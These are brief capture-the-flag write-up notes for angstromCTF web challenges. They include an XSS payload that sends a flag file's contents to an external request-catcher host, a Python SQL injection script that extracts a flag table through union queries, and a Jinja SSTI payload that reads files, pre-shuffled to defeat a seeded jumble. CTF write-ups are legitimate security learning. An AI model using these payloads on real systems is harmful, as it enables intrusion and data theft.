<h1> Markdown </h1>

Basic XSS. 

<img src=x onerror="fetch(`/flag.txt`).then(r=>r.text()).then(r=>fetch(`test.requestcatcher.com?x={encodeURIcomponent(r)}`))">

<h1> Store </h1>

Basic sqli

```
import requests

data = {
    # "item": "' union select '1', '1',(select group_concat(sql) from sqlite_master);-- -",
    "item": "' union select '1', '1',(select flag from flags54e9efdb2f705acee5bd9b30201bae01);-- -",
    # "item": "' union select '1', (select group_concat(name) from items), (select group_concat(detail) from items);-- -",
}

response = requests.post("https://store.web.actf.co/search", data=data)

print(response.text)
print(response.status_code)
```

<h1> Winds </h1>

Basic SSTI but your payload is jumbled before being passed to render_template_string() but good for us we got the seed

```
    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)
```

To get text which would create actual payload when jumbled:

```
target_str = "{{self.__init__.__globals__.__builtins__.open('flag.txt').read()}}"
list_str = list(target_str)
random.seed(0)
random.shuffle(list_str)
new_str = ''.join(list_str)
while new_str != target_str:
  copy_str = new_str
  random.seed(0)
  list_str = list(new_str)
  random.shuffle(list_str)
  new_str = ''.join(list_str)
  print(new_str)
  
```

<h1> Pastebin </h1>

We have partial hashed password like: `Incorrect parameter &password=1797c2...`
Tried to understand but will take some time to understand completly.

<h1> Watermark </h1>

https://alfinj0se.github.io/posts/angstromctf2024/